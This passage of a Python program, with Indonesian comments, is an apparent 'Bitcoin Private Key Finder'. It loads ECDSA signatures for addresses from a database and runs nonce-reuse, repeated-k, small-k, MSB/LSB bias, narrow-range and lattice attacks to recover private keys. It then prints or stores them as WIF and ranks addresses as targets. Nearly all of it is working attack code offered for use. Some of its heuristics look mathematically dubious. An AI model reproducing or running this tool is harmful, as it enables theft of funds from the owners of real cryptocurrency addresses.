        z1 = sig1.z % self.n
        z2 = sig2.z % self.n
        
        s_diff = (s1 - s2) % self.n
        if s_diff == 0:
            return None
            
        try:
            numerator = (z1 * s2 - z2 * s1) % self.n
            denominator = (r * s_diff) % self.n
            denominator_inv = pow(denominator, self.n - 2, self.n)
            private_key = (numerator * denominator_inv) % self.n
            
            if 0 < private_key < self.n:
                k1 = self.recover_k_from_signature(sig1, private_key)
                k2 = self.recover_k_from_signature(sig2, private_key)
                
                if k1 is not None and k2 is not None and k1 == k2:
                    return private_key
                    
        except Exception as e:
            print(f"[!] Error in nonce reuse recovery: {e}")
            
        return None
    
    def recover_k_from_signature(self, sig: Signature, d: int) -> Optional[int]:
        """Recover k value jika private key diketahui: k = (z + r*d) * s⁻¹ mod n"""
        try:
            s_inv = pow(sig.s, self.n - 2, self.n)
            k = ((sig.z + sig.r * d) % self.n) * s_inv % self.n
            return k
        except:
            return None
    
    def detect_repeated_k_patterns(self, signatures: List[Signature]) -> Optional[Tuple[int, List[int]]]:
        """Deteksi pola k yang berulang"""
        if len(signatures) < 2:
            return None
            
        sig_map = {}
        for sig in signatures:
            key = (sig.txid, sig.input_index, sig.sig_index)
            if key not in sig_map:
                sig_map[key] = sig
        
        unique_sigs = list(sig_map.values())
        
        if len(unique_sigs) < 2:
            return None
            
        print(f"    Analyzing {len(unique_sigs)} unique signatures for repeated k...")
        
        for i in range(len(unique_sigs)):
            for j in range(i + 1, len(unique_sigs)):
                sig1 = unique_sigs[i]
                sig2 = unique_sigs[j]
                
                if sig1.r == sig2.r:
                    continue
                
                try:
                    coeff_k = (sig1.s * sig2.r - sig2.s * sig1.r) % self.n
                    if coeff_k == 0:
                        continue
                        
                    rhs = (sig1.z * sig2.r - sig2.z * sig1.r) % self.n
                    coeff_inv = pow(coeff_k, self.n - 2, self.n)
                    k = (rhs * coeff_inv) % self.n
                    
                    r1_inv = pow(sig1.r, self.n - 2, self.n)
                    d1 = ((sig1.s * k - sig1.z) % self.n) * r1_inv % self.n
                    
                    r2_inv = pow(sig2.r, self.n - 2, self.n)
                    d2 = ((sig2.s * k - sig2.z) % self.n) * r2_inv % self.n
                    
                    if d1 == d2 and 0 < d1 < self.n:
                        verified_count = 0
                        k_values = []
                        
                        for sig in unique_sigs[:10]:
                            k_calc = self.recover_k_from_signature(sig, d1)
                            if k_calc is not None:
                                k_values.append(k_calc)
                                if k_calc == k:
                                    verified_count += 1
                        
                        if verified_count >= 2:
                            print(f"    ✓ Found repeated k pattern with {verified_count} matches")
                            return d1, k_values
                            
                except Exception as e:
                    continue
        
        return None
    
    def biased_nonce_attack(self, address: str, signatures: List[Signature]) -> Optional[KeyResult]:
        """
        Attack comprehensive untuk biased/weak nonce
        """
        if len(signatures) < 5:
            return None
        
        print(f"\n[+] Analyzing biased/weak nonce patterns for {address}")
        print(f"    Signatures: {len(signatures)}")
        
        # 1. Analisis bias
        bias_analysis = self.analyzer.analyze_signatures(address, signatures)
        
        print(f"    Bias Score: {bias_analysis.bias_score:.2f}")
        for rec in bias_analysis.recommendations:
            print(f"    - {rec}")
        
        if bias_analysis.bias_score < 0.3:
            print("    [!] Insufficient bias for effective attack")
            return None
        
        result = None
        
        # 2. Statistical attacks berdasarkan analisis
        if bias_analysis.small_k_detected:
            print("    [Attack] Trying small k brute force...")
            d = self.stat_attack.brute_force_small_k(signatures, max_k=2**20)
            if d:
                verified, msg = self.verify_private_key(d, address)
                if verified:
                    result = KeyResult(
                        address=address,
                        private_key=d,
                        wif=self.int_to_wif(d),
                        method="small_k_bruteforce",
                        confidence=0.75,
                        details="Found via small k brute force (k < 2^20)"
                    )
        
        if not result and bias_analysis.msb_zero_patterns:
            print("    [Attack] Trying MSB zero attack...")
            d = self.stat_attack.msb_zero_attack(signatures, bias_analysis.msb_zero_patterns)
            if d:
                verified, msg = self.verify_private_key(d, address)
                if verified:
                    result = KeyResult(
                        address=address,
                        private_key=d,
                        wif=self.int_to_wif(d),
                        method="msb_zero_bias",
                        confidence=0.70,
                        details=f"MSB zero at bits: {bias_analysis.msb_zero_patterns}"
                    )
        
        if not result and bias_analysis.lsb_zero_patterns:
            print("    [Attack] Trying LSB zero attack...")
            d = self.stat_attack.lsb_zero_attack(signatures, bias_analysis.lsb_zero_patterns)
            if d:
                verified, msg = self.verify_private_key(d, address)
                if verified:
                    result = KeyResult(
                        address=address,
                        private_key=d,
                        wif=self.int_to_wif(d),
                        method="lsb_zero_bias",
                        confidence=0.65,
                        details=f"LSB zero at bits: {bias_analysis.lsb_zero_patterns}"
                    )
        
        if not result and (bias_analysis.k_range_estimate[1] - bias_analysis.k_range_estimate[0] < 10000):
            print("    [Attack] Trying narrow range attack...")
            d = self.stat_attack.narrow_range_attack(signatures, bias_analysis.k_range_estimate)
            if d:
                verified, msg = self.verify_private_key(d, address)
                if verified:
                    result = KeyResult(
                        address=address,
                        private_key=d,
                        wif=self.int_to_wif(d),
                        method="narrow_k_range",
                        confidence=0.60,
                        details=f"k in range [{bias_analysis.k_range_estimate[0]}, {bias_analysis.k_range_estimate[1]}]"
                    )
        
        # 3. Lattice attack (jika tersedia)
        if not result and len(signatures) >= 8:
            print("    [Attack] Trying lattice (HNP) attack...")
            d = self.lattice_attack.recover_key_from_lattice(signatures, known_bits=8)
            if d:
                verified, msg = self.verify_private_key(d, address)
                if verified:
                    result = KeyResult(
                        address=address,
                        private_key=d,
                        wif=self.int_to_wif(d),
                        method="lattice_hnp",
                        confidence=0.80,
                        details="Hidden Number Problem lattice attack"
                    )
        
        # 4. Combined heuristic attack
        if not result and len(signatures) >= 6:
            print("    [Attack] Trying combined heuristic...")
            
            # Cari pola yang tidak terdeteksi sebelumnya
            for known_bits in [1, 2, 4, 8, 16]:
                print(f"    Testing known_bits={known_bits}...")
                
                for i in range(min(5, len(signatures))):
                    for j in range(i+1, min(10, len(signatures))):
                        sig1, sig2 = signatures[i], signatures[j]
                        
                        try:
                            # Asumsi k habis dibagi 2^known_bits
                            divisor = 1 << known_bits
                            
                            # Coba selesaikan sistem
                            s1_inv = pow(sig1.s, self.n - 2, self.n)
                            s2_inv = pow(sig2.s, self.n - 2, self.n)
                            
                            a1 = (sig1.r * s1_inv) % self.n
                            b1 = (-sig1.z * s1_inv) % self.n
                            
                            a2 = (sig2.r * s2_inv) % self.n
                            b2 = (-sig2.z * s2_inv) % self.n
                            
                            # d = (b2 - b1) / (a1 - a2) mod n
                            diff_a = (a1 - a2) % self.n
                            if diff_a == 0:
                                continue
                            
                            diff_a_inv = pow(diff_a, self.n - 2, self.n)
                            d_candidate = ((b2 - b1) * diff_a_inv) % self.n
                            
                            # Verifikasi
                            if 0 < d_candidate < self.n:
                                verified = 0
                                for sig in signatures[:5]:
                                    k = self.recover_k_from_signature(sig, d_candidate)
                                    if k and k % divisor == 0:
                                        verified += 1
                                
                                if verified >= 3:
                                    verified, msg = self.verify_private_key(d_candidate, address)
                                    if verified:
                                        result = KeyResult(
                                            address=address,
                                            private_key=d_candidate,
                                            wif=self.int_to_wif(d_candidate),
                                            method=f"combined_heuristic_bits{known_bits}",
                                            confidence=0.50 + (known_bits * 0.02),
                                            details=f"k divisible by {divisor}"
                                        )
                                        break
                                    
                        except:
                            continue
                    
                    if result:
                        break
                if result:
                    break
        
        return result

# ========== PRIVATE KEY FINDER (ENHANCED) ==========
class PrivateKeyFinderEnhanced:
    """Kelas enhanced untuk mencari private key dengan semua teknik"""
    
    def __init__(self, db_path: str = "valid_nonce_reuse.db"):
        self.db_manager = DatabaseManager(db_path)
        self.attack = ECDSAAttackEnhanced()
        self.stats = {
            'total_addresses': 0,
            'keys_found': 0,
            'nonce_reuse': 0,
            'biased_nonce': 0,
            'repeated_k': 0,
            'small_k': 0
        }
    
    def find_private_key_enhanced(self, address: str) -> Optional[KeyResult]:
        """Cari private key dengan semua teknik termasuk biased nonce"""
        print(f"\n{'='*70}")
        print(f"🔍 ENHANCED SEARCH FOR: {address}")
        print(f"{'='*70}")
        
        signatures = self.db_manager.get_signatures_by_address(address)
        
        if not signatures:
            print(f"[!] No signatures found for address {address}")
            return None
        
        valid_signatures = [sig for sig in signatures if sig.z > 0]
        
        if not valid_signatures:
            print(f"[!] No valid signatures with non-zero z values")
            return None
            
        total_sigs = len(valid_signatures)
        print(f"[*] Found {total_sigs} valid signatures")
        
        # 1. Nonce Reuse Attack
        print(f"\n[1] Nonce reuse attack...")
        r_groups = {}
        for sig in valid_signatures:
            if sig.r not in r_groups:
                r_groups[sig.r] = []
            r_groups[sig.r].append(sig)
        
        for r, sig_list in r_groups.items():
            if len(sig_list) >= 2:
                for i in range(len(sig_list)):
                    for j in range(i + 1, len(sig_list)):
                        sig1, sig2 = sig_list[i], sig_list[j]
                        
                        if sig1.txid == sig2.txid:
                            continue
                            
                        private_key = self.attack.recover_private_key_from_nonce_reuse(sig1, sig2)
                        if private_key:
                            verified, msg = self.attack.verify_private_key(private_key, address)
                            if verified:
                                wif = self.attack.int_to_wif(private_key)
                                if wif:
                                    self.stats['nonce_reuse'] += 1
                                    return KeyResult(
                                        address=address,
                                        private_key=private_key,
                                        wif=wif,
                                        method="nonce_reuse",
                                        txid1=sig1.txid,
                                        txid2=sig2.txid,
                                        confidence=0.95,
                                        details=f"r=0x{r:x}, txids: {sig1.txid[:16]}..., {sig2.txid[:16]}..."
                                    )
        
        # 2. Repeated K Patterns
        if total_sigs >= 3:
            print(f"\n[2] Repeated k patterns...")
            repeated_k_result = self.attack.detect_repeated_k_patterns(valid_signatures)
            
            if repeated_k_result:
                private_key, k_values = repeated_k_result
                verified, msg = self.attack.verify_private_key(private_key, address)
                if verified:
                    wif = self.attack.int_to_wif(private_key)
                    if wif:
                        self.stats['repeated_k'] += 1
                        return KeyResult(
                            address=address,
                            private_key=private_key,
                            wif=wif,
                            method="repeated_k_pattern",
                            confidence=0.85,
                            details=f"Found {len(k_values)} matching k values"
                        )
        
        # 3. Biased/Weak Nonce Attacks (NEW)
        if total_sigs >= 5:
            print(f"\n[3] Biased/Weak nonce attacks...")
            biased_result = self.attack.biased_nonce_attack(address, valid_signatures)
            
            if biased_result:
                # Verifikasi hasil
                verified, msg = self.attack.verify_private_key(biased_result.private_key, address)
                if verified:
                    self.stats['biased_nonce'] += 1
                    return biased_result
                else:
                    print(f"    [!] Biased nonce result failed verification: {msg}")
        
        # 4. Small k heuristic (fallback)
        if total_sigs >= 2:
            print(f"\n[4] Small k heuristic...")
            
            for test_k in [1, 2, 3, 4, 5, 10, 100, 1000, 10000]:
                candidate_keys = set()
                
                for sig in valid_signatures[:5]:
                    try:
                        r_inv = pow(sig.r, N - 2, N)
                        d = ((sig.s * test_k - sig.z) % N) * r_inv % N
                        
                        if 0 < d < N:
                            candidate_keys.add(d)
                    except:
                        continue
                
                for d in candidate_keys:
                    verified_count = 0
                    for sig in valid_signatures[:3]:
                        k_calc = self.attack.recover_k_from_signature(sig, d)
                        if k_calc == test_k:
                            verified_count += 1
                    
                    if verified_count >= 2:
                        verified, msg = self.attack.verify_private_key(d, address)
                        if verified:
                            wif = self.attack.int_to_wif(d)
                            if wif:
                                self.stats['small_k'] += 1
                                return KeyResult(
                                    address=address,
                                    private_key=d,
                                    wif=wif,
                                    method=f"small_k_heuristic(k={test_k})",
                                    confidence=0.70,
                                    details=f"k={test_k}, verified with {verified_count} signatures"
                                )
        
        print(f"\n[!] No private key found for address {address}")
        print(f"    Total signatures analyzed: {total_sigs}")
        
        return None
    
    def scan_all_addresses_enhanced(self, min_sigs: int = 5, bias_threshold: float = 0.3) -> List[KeyResult]:
        """Scan semua address dengan teknik enhanced"""
        addresses_info = self.db_manager.get_addresses_with_multiple_sigs(min_sigs)
        
        if not addresses_info:
            print(f"[!] No addresses found with at least {min_sigs} signatures")
            return []
        
        print(f"\n{'='*70}")
        print(f"🔍 ENHANCED SCAN - {len(addresses_info)} ADDRESSES (min {min_sigs} sigs)")
        print(f"{'='*70}")
        
        results = []
        analyzer = BiasedNonceAnalyzer()
        
        # Analisis awal untuk identifikasi target prioritas
        print(f"\n[Phase 1] Bias analysis for target prioritization...")
        prioritized_addresses = []
        
        for address, sig_count in addresses_info:
            signatures = self.db_manager.get_signatures_by_address(address)
            valid_sigs = [sig for sig in signatures if sig.z > 0]
            
            if len(valid_sigs) >= min_sigs:
                analysis = analyzer.analyze_signatures(address, valid_sigs)
                
                if analysis.bias_score >= bias_threshold:
                    prioritized_addresses.append((address, sig_count, analysis.bias_score))
        
        # Sort by bias score
        prioritized_addresses.sort(key=lambda x: x[2], reverse=True)
        
        print(f"Found {len(prioritized_addresses)} addresses with bias score >= {bias_threshold}")
        if prioritized_addresses:
            print(f"Top 10 targets:")
            for i, (addr, count, score) in enumerate(prioritized_addresses[:10]):
                print(f"  {i+1}. {addr[:16]}... - {count} sigs, score: {score:.2f}")
        else:
            print("No addresses with sufficient bias score found.")
            return results
        
        # Phase 2: Attack
        print(f"\n[Phase 2] Attack phase...")
        for i, (address, sig_count, bias_score) in enumerate(prioritized_addresses, 1):
            print(f"\n[{i}/{len(prioritized_addresses)}] {address[:16]}...")
            print(f"    Signatures: {sig_count}, Bias score: {bias_score:.2f}")
            
            result = self.find_private_key_enhanced(address)
            if result:
                self.db_manager.save_recovered_key(result)
                results.append(result)
                self.stats['keys_found'] += 1
                print(f"    ✓ KEY FOUND: {result.method}")
            else:
                print(f"    ✗ No key found")
        
        # Tampilkan statistik
        print(f"\n{'='*70}")
        print(f"📊 ENHANCED SCAN COMPLETE")
        print(f"{'='*70}")
        print(f"Total addresses analyzed: {len(prioritized_addresses)}")
        print(f"Private keys found: {self.stats['keys_found']}")
        
        if self.stats['keys_found'] > 0:
            success_rate = (self.stats['keys_found'] / len(prioritized_addresses)) * 100
            print(f"Success rate: {success_rate:.1f}%")
            print(f"\nBreakdown by method:")
            print(f"  Nonce reuse: {self.stats['nonce_reuse']}")
            print(f"  Biased nonce: {self.stats['biased_nonce']}")
            print(f"  Repeated k: {self.stats['repeated_k']}")
            print(f"  Small k: {self.stats['small_k']}")
            
            print(f"\nFound private keys:")
            for result in results:
                print(f"  {result.address[:16]}...: {result.method} (conf: {result.confidence:.2f})")
        else:
            print(f"Success rate: 0%")
        
        return results

# ========== MAIN FUNCTION (ENHANCED) ==========
def main_enhanced():
    """Fungsi utama untuk versi enhanced"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Enhanced Bitcoin Private Key Finder with Biased Nonce Attacks',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Enhanced Attack Methods:
  1. Nonce Reuse (same r) - Traditional
  2. Repeated k Patterns - Advanced
  3. Biased Nonce:
     - MSB/LSB zero bias
     - Small k values
     - Narrow k range
  4. Lattice Attack (HNP) - Hidden Number Problem
  5. Statistical attacks

Examples:
  %(prog)s -a 1ABC1234...           # Enhanced search for address
  %(prog)s --enhanced-scan          # Enhanced scan all addresses
  %(prog)s --bias-threshold 0.4     # Set bias threshold (default: 0.3)
  %(prog)s --min-sigs 10            # Minimum signatures for scan
        """
    )
    
    parser.add_argument('-a', '--address', help='Bitcoin address to search')
    parser.add_argument('--enhanced-scan', action='store_true', help='Enhanced scan all addresses')
    parser.add_argument('--min-sigs', type=int, default=5, help='Minimum signatures (default: 5)')
    parser.add_argument('--bias-threshold', type=float, default=0.3, help='Bias score threshold (default: 0.3)')
    parser.add_argument('--db', default='valid_nonce_reuse.db', help='Database path')
    
    args = parser.parse_args()
    
    finder = PrivateKeyFinderEnhanced(args.db)
    
    if args.enhanced_scan:
        print("\n" + "="*70)
        print("🚀 ENHANCED BITCOIN PRIVATE KEY FINDER")
        print("="*70)
        print(f"Database: {args.db}")
        print(f"Minimum signatures: {args.min_sigs}")
        print(f"Bias threshold: {args.bias_threshold}")
        print("="*70)
        
        finder.scan_all_addresses_enhanced(
            min_sigs=args.min_sigs,
            bias_threshold=args.bias_threshold
        )
    elif args.address:
        print("\n" + "="*70)
        print(f"🚀 ENHANCED SEARCH FOR: {args.address}")
        print("="*70)
        
        result = finder.find_private_key_enhanced(args.address)
        if result:
            print(f"\n{'='*70}")
            print(f"🎉 PRIVATE KEY FOUND!")
            print(f"{'='*70}")
            print(f"Address:        {result.address}")
            print(f"Private Key:    0x{result.private_key:x}")
            print(f"WIF:            {result.wif}")
            print(f"Method:         {result.method}")
            print(f"Confidence:     {result.confidence:.2f}")
            print(f"Details:        {result.details}")
            
            if result.txid1 and result.txid2:
                print(f"TX1:            {result.txid1[:16]}...")
                print(f"TX2:            {result.txid2[:16]}...")
            print(f"{'='*70}")
            
            save = input("\nSave to database? (y/n): ").strip().lower()
            if save == 'y':
                finder.db_manager.save_recovered_key(result)
        else:
            print(f"\n{'='*70}")
            print(f"❌ PRIVATE KEY NOT FOUND")
            print(f"{'='*70}")
    else:
        # Mode interaktif
        print("\n" + "="*70)
        print("🚀 ENHANCED BITCOIN PRIVATE KEY FINDER")
        print("="*70)
        
        while True:
            print("\nOptions:")
            print("1. Enhanced search for address")
            print("2. Enhanced scan all addresses")
            print("3. Analyze bias patterns")
            print("4. Exit")
            
            choice = input("\nSelect option (1-4): ").strip()
            
            if choice == '1':
                address = input("Enter Bitcoin address: ").strip()
                if address:
                    result = finder.find_private_key_enhanced(address)
                    if result:
                        print(f"\n[✓] Success! WIF: {result.wif}")
                        save = input("Save to database? (y/n): ").strip().lower()
                        if save == 'y':
                            finder.db_manager.save_recovered_key(result)
            elif choice == '2':
                min_sigs = input("Minimum signatures (default 5): ").strip()
                min_sigs = int(min_sigs) if min_sigs.isdigit() else 5
                bias_thresh = input("Bias threshold (default 0.3): ").strip()
                bias_thresh = float(bias_thresh) if bias_thresh.replace('.', '').isdigit() else 0.3
                finder.scan_all_addresses_enhanced(min_sigs, bias_thresh)
            elif choice == '3':
                address = input("Enter address for bias analysis: ").strip()
                if address:
                    signatures = finder.db_manager.get_signatures_by_address(address)
                    valid_sigs = [sig for sig in signatures if sig.z > 0]
                    
                    if len(valid_sigs) >= 3:
                        analyzer = BiasedNonceAnalyzer()
                        analysis = analyzer.analyze_signatures(address, valid_sigs)
                        
                        print(f"\n{'='*70}")
                        print(f"📊 BIAS ANALYSIS: {address}")
                        print(f"{'='*70}")
                        print(f"Signatures: {analysis.signature_count}")
                        print(f"Bias Score: {analysis.bias_score:.2f}")
                        print(f"MSB zero patterns: {analysis.msb_zero_patterns}")
                        print(f"LSB zero patterns: {analysis.lsb_zero_patterns}")
                        print(f"Small k detected: {analysis.small_k_detected}")
                        if analysis.k_range_estimate[0] > 0 or analysis.k_range_estimate[1] < N:
                            print(f"Estimated k range: {hex(analysis.k_range_estimate[0])[:10]}... to {hex(analysis.k_range_estimate[1])[:10]}...")
                        else:
                            print(f"Estimated k range: Full range (0 to {hex(N)[:10]}...)")
                        print(f"\nRecommendations:")
                        for rec in analysis.recommendations:
                            print(f"  • {rec}")
                    else:
                        print(f"Need at least 3 valid signatures for analysis")
            elif choice == '4':
                print("Goodbye!")
                break
            else:
                print("Invalid option")

if __name__ == "__main__":
    try:
        # Cek dependencies
        print("Enhanced Bitcoin Private Key Finder")
        print("="*70)
        
        if not NUMPY_AVAILABLE:
            print("[!] NumPy not available. Lattice attacks will be limited.")
            print("    Install: pip install numpy scipy")
        
        if not FPYLLL_AVAILABLE:
            print("[!] fpylll not available. Advanced lattice attacks disabled.")
            print("    Install: pip install fpylll (requires additional dependencies)")
        
        print("="*70)
        
        # Jalankan main enhanced
        main_enhanced()
    except KeyboardInterrupt:
        print("\n\nOperation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
